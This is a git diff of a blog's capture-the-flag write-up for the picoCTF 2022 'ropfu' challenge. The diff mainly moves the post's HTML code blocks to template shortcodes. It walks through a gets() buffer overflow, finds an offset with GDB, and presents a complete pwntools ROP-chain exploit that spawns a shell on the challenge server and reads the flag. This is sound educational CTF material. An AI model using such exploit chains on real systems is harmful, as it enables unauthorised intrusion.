@@ -13,42 +13,22 @@ permalink: ctfs/pico22/pwn/ropfu/
 thumbnail: https://enscribe.dev/asset/banner/banner-ropfu.png
 ---
 
-<script src="https://kit.fontawesome.com/129342a70b.js" crossorigin="anonymous"></script>
+{% fontawesome %}
 
-<style>
-    .box {
-        border: 1px solid rgb(23, 25, 27);
-        border-radius: 5px;
-        background-color: rgb(23, 25, 27);
-        padding: 1rem;
-        font-size: 90%;
-        text-align: center;
-        margin-top: 1rem;
-        margin-bottom: 1rem;
-    }
+{% box %}
+What's ROP?  
+Can you exploit the following [program](/asset/pico22/ropfu/vuln) to get the flag? Download [source](/asset/pico22/ropfu/vuln.c).  
+`nc saturn.picoctf.net [PORT]`<br><br>
+**Authors**: Sanjay C., Lt. "Syreal" Jones  
+<details><summary>**Hint**:</summary>
+This is a classic ROP to get a shell</details>
+{% endbox %}
 
-    .warning {
-        border: 1px solid #481219;
-        border-radius: 5px;
-        background-color: #481219;
-        padding: 1rem;
-        font-size: 90%;
-        text-align: center;
-    }
+{% warning %}
+Warning: This is an **instance-based** challenge. Port info will be redacted alongside the last eight characters of the flag, as they are dynamic.{% endwarning %}
 
-    .no-highlight {
-        user-select: none;
-        -moz-user-select: none;
-        -webkit-user-select: none;
-        -ms-user-select: none;
-    }
-</style>
-
-<div class="box no-highlight"> What's ROP?<br>Can you exploit the following <a href="/asset/pico22/ropfu/vuln">program</a> to get the flag? Download <a href="/asset/pico22/ropfu/vuln.c">source</a>.<br><code>nc saturn.picoctf.net [PORT]</code><br><br><b>Authors</b>: Sanjay C., Lt. "Syreal" Jones<br><details> <summary><b>Hint</b>:</summary><br>This is a classic ROP to get a shell </details></div>
-
-<div class="warning"> <i class="fa-solid fa-triangle-exclamation"></i> Warning: This is an <b>instance-based</b> challenge. Port info will be redacted alongside the last eight characters of the flag, as they are dynamic.</div>
-
-<figure class="highlight console"> <figcaption><span>checksec.sh</span><a target="_blank" rel="noopener" href="https://github.com/slimm609/checksec.sh"><span style="color:#82C4E4">[github link]</span></a> </figcaption> <table> <tr> <pre><span style="color:#F99157">$ </span>checksec vuln
+{% ccb html:true caption:checksec.sh url:'github.com/slimm609/checksec.sh' url_text:'github link' %}
+<span style="color:#F99157">$ </span>checksec vuln
 [<span style="color:#277FFF"><b>*</b></span>] '/home/kali/ctfs/pico22/ropfu/vuln'
     Arch:     i386-32-little
     RELRO:    <span style="color:#FEA44C">Partial RELRO</span>
@@ -56,21 +36,77 @@ thumbnail: https://enscribe.dev/asset/banner/banner-ropfu.png
     NX:       <span style="color:#D41919">NX disabled</span>
     PIE:      <span style="color:#D41919">No PIE (0x8048000)</span>
     RWX:      <span style="color:#D41919">Has RWX segments</span>
-</pre> </td></tr></table></figure>
+{% endccb %}
 
 Hey, look: a classic "ROP" (return-oriented programming) challenge with the source code provided! Let's take a look:
 
-<figure class="highlight c"> <figcaption><span>vuln.c</span><a href="https://enscribe.dev/asset/pico22/ropfu/vuln.c"><span style="color:#82C4E4">[download source]</span></a> </figcaption> <table> <tr> <td class="gutter"> <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre> </td><td class="code"> <pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string"><stdio.h></span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string"><stdlib.h></span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string"><string.h></span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string"><unistd.h></span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string"><sys/types.h></span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFSIZE 16</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span> {</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">16</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!\n"</span>);</span><br><span class="line">  <span class="keyword">return</span> gets(buf);</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span>{</span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  <span class="comment">// Set the gid to the effective gid</span></span><br><span class="line">  <span class="comment">// this prevents /bin/sh from dropping the privileges</span></span><br><span class="line">  <span class="type">gid_t</span> gid = getegid();</span><br><span class="line">  setresgid(gid, gid, gid);</span><br><span class="line">  vuln();</span><br><span class="line">  </span><br><span class="line">}</span><br></pre> </td></tr></table></figure>
+{% ccb lang:c caption:vuln.c gutter1:1-10,,11-23 url:'enscribe.dev/asset/pico22/ropfu/vuln.c' url_text:'download source' wrapped:true %}
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/types.h>
+#define BUFSIZE 16
+
+void vuln() {
+    char buf[16];
+    printf("How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!\n");
+    return gets(buf);
+
+}
+
+int main(int argc, char **argv) {
+    setvbuf(stdout, NULL, _IONBF, 0);
+
+    // Set the gid to the effective gid
+    // this prevents /bin/sh from dropping the privileges
+    gid_t gid = getegid();
+    setresgid(gid, gid, gid);
+    vuln();
+}
+
+{% endccb %}
 
 The source only provides us with one vulnerable function: `gets()`. I've gone over this extremely unsafe function multiple times now, so feel free to read [MITRE's Common Weakness Enumeration page](https://cwe.mitre.org/data/definitions/242.html) if you don't know why. There is also no convenient function with `execve("/bin/sh", 0, 0)` in it (for obvious reasons), so we will have to insert our own shellcode.
 
 Although we could totally solve this the old-fashioned way (as John Hammond did in [his writeup](https://www.youtube.com/watch?v=c7wNN8qgxAA)), we can use the power of automation with a tool called [ROPgadget](https://github.com/JonathanSalwan/ROPgadget)! Let's try using it here to **automatically** build the ROP-chain for us, which will eventually lead to a [syscall](https://en.wikipedia.org/wiki/System_call):
 
-<figure class="highlight console"> <figcaption><span>auto rop-chain generation</span><a href="https://github.com/JonathanSalwan/ROPgadget"><span style="color:#82C4E4">[github link]</span></a> </figcaption> <table> <tr> <td class="code"> <pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ROPgadget --binary vuln --ropchain</span></span><br><span class="line">ROP chain generation</span><br><span class="line">===========================================================</span><br><span class="line"></span><br><span class="line">- Step 1 -- Write-what-where gadgets</span><br><span class="line"></span><br><span class="line">    [<span style="color:#47D4B9"><b>+</b></span>] Gadget found: 0x8059102 mov dword ptr [edx], eax ; ret</span><br><span class="line">    [<span style="color:#47D4B9"><b>+</b></span>] Gadget found: 0x80583c9 pop edx ; pop ebx ; ret</span><br><span class="line">    [<span style="color:#47D4B9"><b>+</b></span>] Gadget found: 0x80b074a pop eax ; ret</span><br><span class="line">    [<span style="color:#47D4B9"><b>+</b></span>] Gadget found: 0x804fb90 xor eax, eax ; ret</span><br><span class="line"></span><br><span class="line">- Step 2 -- Init syscall number gadgets</span><br><span class="line"></span><br><span class="line">    [<span style="color:#47D4B9"><b>+</b></span>] Gadget found: 0x804fb90 xor eax, eax ; ret</span><br><span class="line">    [<span style="color:#47D4B9"><b>+</b></span>] Gadget found: 0x808055e inc eax ; ret</span><br><span class="line"></span><br><span class="line">- Step 3 -- Init syscall arguments gadgets</span><br><span class="line"></span><br><span class="line">    [<span style="color:#47D4B9"><b>+</b></span>] Gadget found: 0x8049022 pop ebx ; ret</span><br><span class="line">    [<span style="color:#47D4B9"><b>+</b></span>] Gadget found: 0x8049e39 pop ecx ; ret</span><br><span class="line">    [<span style="color:#47D4B9"><b>+</b></span>] Gadget found: 0x80583c9 pop edx ; pop ebx ; ret</span><br><span class="line"></span><br><span class="line">- Step 4 -- Syscall gadget</span><br><span class="line"></span><br><span class="line">    [<span style="color:#47D4B9"><b>+</b></span>] Gadget found: 0x804a3d2 int 0x80</span><br><span class="line"></span><br><span class="line">- Step 5 -- Build the ROP chain</span><br><span class="line"></span><br><span class="line"><span class="comment">    #!/usr/bin/env python2</span></span><br><span class="line"><span class="comment">    # execve generated by ROPgadget</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">    from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line"><span class="comment">    # Padding goes here</span></span><br><span class="line">    p = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">    payload += pack(<span class="string">'<I'</span>, <span class="number">0x080583c9</span>) <span class="comment"># pop edx ; pop ebx ; ret</span></span><br><span class="line">    payload += pack(<span class="string">'<I'</span>, <span class="number">0x080e5060</span>) <span class="comment"># @ .data</span></span><br><span class="line">    payload += pack(<span class="string">'<I'</span>, <span class="number">0x41414141</span>) <span class="comment"># padding</span></span><br><span class="line">    payload += pack(<span class="string">'<I'</span>, <span class="number">0x080b074a</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">    payload += <span class="string">'/bin'</span></span><br><span class="line">    payload += pack(<span class="string">'<I'</span>, <span class="number">0x08059102</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">    payload += pack(<span class="string">'<I'</span>, <span class="number">0x080583c9</span>) <span class="comment"># pop edx ; pop ebx ; ret</span></span><br><span class="line">    payload += pack(<span class="string">'<I'</span>, <span class="number">0x080e5064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">    payload += pack(<span class="string">'<I'</span>, <span class="number">0x41414141</span>) <span class="comment"># padding</span></span><br><span class="line">    payload += pack(<span class="string">'<I'</span>, <span class="number">0x080b074a</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">    payload += <span class="string">'//sh'</span></span><br><span class="line">    payload += pack(<span class="string">'<I'</span>, <span class="number">0x08059102</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">    payload += pack(<span class="string">'<I'</span>, <span class="number">0x080583c9</span>) <span class="comment"># pop edx ; pop ebx ; ret</span></span><br><span class="line">    payload += pack(<span class="string">'<I'</span>, <span class="number">0x080e5068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">    payload += pack(<span class="string">'<I'</span>, <span class="number">0x41414141</span>) <span class="comment"># padding</span></span><br><span class="line">    payload += pack(<span class="string">'<I'</span>, <span class="number">0x0804fb90</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">    payload += pack(<span class="string">'<I'</span>, <span class="number">0x08059102</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">    payload += pack(<span class="string">'<I'</span>, <span class="number">0x08049022</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">    payload += pack(<span class="string">'<I'</span>, <span class="number">0x080e5060</span>) <span class="comment"># @ .data</span></span><br><span class="line">    payload += pack(<span class="string">'<I'</span>, <span class="number">0x08049e39</span>) <span class="comment"># pop ecx ; ret</span></span><br><span class="line">    payload += pack(<span class="string">'<I'</span>, <span class="number">0x080e5068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">    payload += pack(<span class="string">'<I'</span>, <span class="number">0x080583c9</span>) <span class="comment"># pop edx ; pop ebx ; ret</span></span><br><span class="line">    payload += pack(<span class="string">'<I'</span>, <span class="number">0x080e5068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">    payload += pack(<span class="string">'<I'</span>, <span class="number">0x080e5060</span>) <span class="comment"># padding without overwrite ebx</span></span><br><span class="line">    payload += pack(<span class="string">'<I'</span>, <span class="number">0x0804fb90</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">    payload += pack(<span class="string">'<I'</span>, <span class="number">0x0808055e</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    payload += pack(<span class="string">'<I'</span>, <span class="number">0x0808055e</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    payload += pack(<span class="string">'<I'</span>, <span class="number">0x0808055e</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    payload += pack(<span class="string">'<I'</span>, <span class="number">0x0808055e</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    payload += pack(<span class="string">'<I'</span>, <span class="number">0x0808055e</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    payload += pack(<span class="string">'<I'</span>, <span class="number">0x0808055e</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    payload += pack(<span class="string">'<I'</span>, <span class="number">0x0808055e</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    payload += pack(<span class="string">'<I'</span>, <span class="number">0x0808055e</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    payload += pack(<span class="string">'<I'</span>, <span class="number">0x0808055e</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    payload += pack(<span class="string">'<I'</span>, <span class="number">0x0808055e</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    payload += pack(<span class="string">'<I'</span>, <span class="number">0x0808055e</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    payload += pack(<span class="string">'<I'</span>, <span class="number">0x0804a3d2</span>) <span class="comment"># int 0x80</span></span><br></pre> </td></tr></table></figure>
+{% ccb html:true caption:'auto rop-chain generation' url:'github.com/JonathanSalwan/ROPgadget' url_text:'github link' scrollable:true %}
+<span class="meta prompt_">$ </span><span class="language-bash">ROPgadget --binary vuln --ropchain</span>
+
+ROP chain generation
+===========================================================
+
+- Step 1 -- Write-what-where gadgets
+
+    [<span style="color:#47D4B9"><b>+</b></span>] Gadget found: 0x8059102 mov dword ptr [edx], eax ; ret
+    [<span style="color:#47D4B9"><b>+</b></span>] Gadget found: 0x80583c9 pop edx ; pop ebx ; ret
+    [<span style="color:#47D4B9"><b>+</b></span>] Gadget found: 0x80b074a pop eax ; ret
+    [<span style="color:#47D4B9"><b>+</b></span>] Gadget found: 0x804fb90 xor eax, eax ; ret
+
+- Step 2 -- Init syscall number gadgets
+
+    [<span style="color:#47D4B9"><b>+</b></span>] Gadget found: 0x804fb90 xor eax, eax ; ret
+    [<span style="color:#47D4B9"><b>+</b></span>] Gadget found: 0x808055e inc eax ; ret
+
+- Step 3 -- Init syscall arguments gadgets
+
+    [<span style="color:#47D4B9"><b>+</b></span>] Gadget found: 0x8049022 pop ebx ; ret
+    [<span style="color:#47D4B9"><b>+</b></span>] Gadget found: 0x8049e39 pop ecx ; ret
+    [<span style="color:#47D4B9"><b>+</b></span>] Gadget found: 0x80583c9 pop edx ; pop ebx ; ret
+
+- Step 4 -- Syscall gadget
+
+    [<span style="color:#47D4B9"><b>+</b></span>] Gadget found: 0x804a3d2 int 0x80
+
+- Step 5 -- Build the ROP chain
+<div class="skip-highlight">(omitted for brevity, will be in final script!)</div>
+{% endccb %}
 
 Oh, wow. It generated the entire script for us (unfortunately in Python2), with only a few missing bits and bobs! The only things we need to manually configure now are the offset and remote connection. Since the `checksec` mentioned that there was a canary enabled, it looks like we'll have to manually guess the offset with the `$eip`:
 
-<figure class="highlight text" style="margin-bottom:-2.5%"> <figcaption><span>GEF - "GDB enhanced features"</span><a href="https://gef.readthedocs.io/en/master/"><span style="color:#82C4E4">[documentation]</span></a> </figcaption><table><tr><td class="code"><pre><span style="color:#47D4B9"><b>gef➤  </b></span>shell python3 -q
+{% ccb html:true caption:'GDB - \"GDB enhanced features\"' url:'gef.readthedocs.io/en/master' url_text:documentation %}
+<span style="color:#47D4B9"><b>gef➤  </b></span>shell python3 -q
 >>> print('A'*28 + 'B'*4)
 AAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
 >>> 
@@ -86,8 +122,8 @@ Program received signal SIGSEGV, Segmentation fault.
 <span style="color:#EC0101"><b>$eax   </b></span>: <span style="color:#9755B3">0xffffd540</span>  →  <span style="color:#FEA44C">"AAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB"</span>
 <span style="color:#EC0101"><b>$ebx   </b></span>: 0x41414141 ("<span style="color:#FEA44C">AAAA</span>"?)
 <span style="color:#EC0101"><b>$ecx   </b></span>: <span style="color:#D41919">0x80e5300</span>  →  <span style="color:#585858"><b><_IO_2_1_stdin_+0> mov BYTE PTR [edx], ah</b></span>
-<span style="color:#EC0101"><b>$edx   </b></span>: <span style="color:#9755B3">0xffffd560</span>  →  <span style="color:#D41919">0x80e5000</span>  →  <span style="color:#585858"><b><_GLOBAL_OFFSET_TABLE_+0> add BYTE PTR [eax], al</b></span>
-<span style="color:#EC0101"><b>$esp   </b></span>: <span style="color:#9755B3">0xffffd560</span>  →  <span style="color:#D41919">0x80e5000</span>  →  <span style="color:#585858"><b><_GLOBAL_OFFSET_TABLE_+0> add BYTE PTR [eax], al</b></span>
+<span style="color:#EC0101"><b>$edx   </b></span>: <span style="color:#9755B3">0xffffd560</span>  →  <span style="color:#D41919">0x80e5000</span>  →  <span style="color:#585858"><b><_GLOBAL_OFFSET_TABLE_+0> add BYTE PTR [eax]</b></span>
+<span style="color:#EC0101"><b>$esp   </b></span>: <span style="color:#9755B3">0xffffd560</span>  →  <span style="color:#D41919">0x80e5000</span>  →  <span style="color:#585858"><b><_GLOBAL_OFFSET_TABLE_+0> add BYTE PTR [eax]</b></span>
 <span style="color:#EC0101"><b>$ebp   </b></span>: 0x41414141 ("<span style="color:#FEA44C">AAAA</span>"?)
 <span style="color:#EC0101"><b>$esi   </b></span>: <span style="color:#D41919">0x80e5000</span>  →  <span style="color:#585858"><b><_GLOBAL_OFFSET_TABLE_+0> add BYTE PTR [eax], al</b></span>
 <span style="color:#EC0101"><b>$edi   </b></span>: <span style="color:#D41919">0x80e5000</span>  →  <span style="color:#585858"><b><_GLOBAL_OFFSET_TABLE_+0> add BYTE PTR [eax], al</b></span>
@@ -98,15 +134,65 @@ Program received signal SIGSEGV, Segmentation fault.
 <span style="color:#EC0101"><b>[!]</b></span> Cannot access memory at address 0x42424242
 <span style="color:#585858"><b>────────────────────────────────────────────────────────────────────── </b></span><span style="color:#49AEE6">threads</span><span style="color:#585858"><b> ────</b></span>
 [<span style="color:#47D4B9"><b>#0</b></span>] Id 1, Name: "vuln", <span style="color:#EC0101"><b>stopped</b></span> <span style="color:#367BF0">0x42424242</span> in <span style="color:#FF8A18"><b>??</b></span> (), reason: <span style="color:#962AC3"><b>SIGSEGV</b></span>
-</pre></td></tr></table></figure>
+{% endccb %}
 
 The offset is 28, as we've successfully loaded 4 hex `B`s into the `$eip`. Our last step is to set up the remote connection with [pwntools](https://docs.pwntools.com/en/stable/). Here is my final script:
 
-<figure class="highlight py"> <figcaption><span>ropfu.py</span><a href="https://gist.github.com/jktrn/17d531a5738b4592f6d718fc0eb1b508"><span style="color:#82C4E4">[github gist link]</span></a> </figcaption> <table> <tr> <td class="gutter"> <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre> </td><td class="code"> <pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">28</span></span><br><span class="line"></span><br><span class="line">payload += pack(<span class="string">'<I'</span>, <span class="number">0x080583c9</span>) <span class="comment"># pop edx ; pop ebx ; ret</span></span><br><span class="line">payload += pack(<span class="string">'<I'</span>, <span class="number">0x080e5060</span>) <span class="comment"># @ .data</span></span><br><span class="line">payload += pack(<span class="string">'<I'</span>, <span class="number">0x41414141</span>) <span class="comment"># padding</span></span><br><span class="line">payload += pack(<span class="string">'<I'</span>, <span class="number">0x080b074a</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">payload += <span class="string">'/bin'</span></span><br><span class="line">payload += pack(<span class="string">'<I'</span>, <span class="number">0x08059102</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">'<I'</span>, <span class="number">0x080583c9</span>) <span class="comment"># pop edx ; pop ebx ; ret</span></span><br><span class="line">payload += pack(<span class="string">'<I'</span>, <span class="number">0x080e5064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">payload += pack(<span class="string">'<I'</span>, <span class="number">0x41414141</span>) <span class="comment"># padding</span></span><br><span class="line">payload += pack(<span class="string">'<I'</span>, <span class="number">0x080b074a</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">payload += <span class="string">'//sh'</span></span><br><span class="line">payload += pack(<span class="string">'<I'</span>, <span class="number">0x08059102</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">'<I'</span>, <span class="number">0x080583c9</span>) <span class="comment"># pop edx ; pop ebx ; ret</span></span><br><span class="line">payload += pack(<span class="string">'<I'</span>, <span class="number">0x080e5068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">payload += pack(<span class="string">'<I'</span>, <span class="number">0x41414141</span>) <span class="comment"># padding</span></span><br><span class="line">payload += pack(<span class="string">'<I'</span>, <span class="number">0x0804fb90</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">'<I'</span>, <span class="number">0x08059102</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">'<I'</span>, <span class="number">0x08049022</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">payload += pack(<span class="string">'<I'</span>, <span class="number">0x080e5060</span>) <span class="comment"># @ .data</span></span><br><span class="line">payload += pack(<span class="string">'<I'</span>, <span class="number">0x08049e39</span>) <span class="comment"># pop ecx ; ret</span></span><br><span class="line">payload += pack(<span class="string">'<I'</span>, <span class="number">0x080e5068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">payload += pack(<span class="string">'<I'</span>, <span class="number">0x080583c9</span>) <span class="comment"># pop edx ; pop ebx ; ret</span></span><br><span class="line">payload += pack(<span class="string">'<I'</span>, <span class="number">0x080e5068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">payload += pack(<span class="string">'<I'</span>, <span class="number">0x080e5060</span>) <span class="comment"># padding without overwrite ebx</span></span><br><span class="line">payload += pack(<span class="string">'<I'</span>, <span class="number">0x0804fb90</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">'<I'</span>, <span class="number">0x0808055e</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">'<I'</span>, <span class="number">0x0808055e</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">'<I'</span>, <span class="number">0x0808055e</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">'<I'</span>, <span class="number">0x0808055e</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">'<I'</span>, <span class="number">0x0808055e</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">'<I'</span>, <span class="number">0x0808055e</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">'<I'</span>, <span class="number">0x0808055e</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">'<I'</span>, <span class="number">0x0808055e</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">'<I'</span>, <span class="number">0x0808055e</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">'<I'</span>, <span class="number">0x0808055e</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">'<I'</span>, <span class="number">0x0808055e</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">'<I'</span>, <span class="number">0x0804a3d2</span>) <span class="comment"># int 0x80</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"saturn.picoctf.net"</span>, [PORT])</span><br><span class="line"><span class="built_in">print</span>(p.recvS())</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre> </td></tr></table></figure>
+{% ccb lang:py gutter1:1-48 caption:ropfu.py url:gist.github.com/jktrn/17d531a5738b4592f6d718fc0eb1b508 url_text:'github gist link' %}
+#!/usr/bin/env python2
+from pwn import *
+from struct import pack
+
+payload = 'A'*28
+
+payload += pack('<I', 0x080583c9) # pop edx ; pop ebx ; ret
+payload += pack('<I', 0x080e5060) # @ .data
+payload += pack('<I', 0x41414141) # padding
+payload += pack('<I', 0x080b074a) # pop eax ; ret
+payload += '/bin'
+payload += pack('<I', 0x08059102) # mov dword ptr [edx], eax ; ret
+payload += pack('<I', 0x080583c9) # pop edx ; pop ebx ; ret
+payload += pack('<I', 0x080e5064) # @ .data + 4
+payload += pack('<I', 0x41414141) # padding
+payload += pack('<I', 0x080b074a) # pop eax ; ret
+payload += '//sh'
+payload += pack('<I', 0x08059102) # mov dword ptr [edx], eax ; ret
+payload += pack('<I', 0x080583c9) # pop edx ; pop ebx ; ret
+payload += pack('<I', 0x080e5068) # @ .data + 8
+payload += pack('<I', 0x41414141) # padding
+payload += pack('<I', 0x0804fb90) # xor eax, eax ; ret
+payload += pack('<I', 0x08059102) # mov dword ptr [edx], eax ; ret
+payload += pack('<I', 0x08049022) # pop ebx ; ret
+payload += pack('<I', 0x080e5060) # @ .data
+payload += pack('<I', 0x08049e39) # pop ecx ; ret
+payload += pack('<I', 0x080e5068) # @ .data + 8
+payload += pack('<I', 0x080583c9) # pop edx ; pop ebx ; ret
+payload += pack('<I', 0x080e5068) # @ .data + 8
+payload += pack('<I', 0x080e5060) # padding without overwrite ebx
+payload += pack('<I', 0x0804fb90) # xor eax, eax ; ret
+payload += pack('<I', 0x0808055e) # inc eax ; ret
+payload += pack('<I', 0x0808055e) # inc eax ; ret
+payload += pack('<I', 0x0808055e) # inc eax ; ret
+payload += pack('<I', 0x0808055e) # inc eax ; ret
+payload += pack('<I', 0x0808055e) # inc eax ; ret
+payload += pack('<I', 0x0808055e) # inc eax ; ret
+payload += pack('<I', 0x0808055e) # inc eax ; ret
+payload += pack('<I', 0x0808055e) # inc eax ; ret
+payload += pack('<I', 0x0808055e) # inc eax ; ret
+payload += pack('<I', 0x0808055e) # inc eax ; ret
+payload += pack('<I', 0x0808055e) # inc eax ; ret
+payload += pack('<I', 0x0804a3d2) # int 0x80
+
+p = remote("saturn.picoctf.net", [PORT])
+log.info(p.recvS())
+p.sendline(payload)
+p.interactive()
+{% endccb %}
 
 Let's run the script:
 
-<figure class="highlight console"> <table> <tr> <td class="code"><pre><span style="color:#F99157">$ </span> python2 exp.py
+{% ccb html:true %}
+<span style="color:#F99157">$ </span> python2 exp.py
 <pre>python2 exp.py
 [<span style="color:#47D4B9"><b>+</b></span>] Opening connection to saturn.picoctf.net on port 58931: Done
 [<span style="color:#277FFF"><b>*</b></span>] How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!
@@ -118,7 +204,7 @@ flag.txt
 vuln
 <span style="color:#EC0101"><b>$</b></span> cat flag.txt
 picoCTF{5n47ch_7h3_5h311_<span style="color:#696969"><b>[REDACTED]</b></span>}<span style="color:#EC0101"><b>$</b></span> <span style="background-color:#FFFFFF"><span style="color:#1A1C23"> </span></span>
-</pre></td></tr></table></figure>
+{% endccb %}
 
 I know the way of ROP-fu, old man. Your shell has been snatched.
 
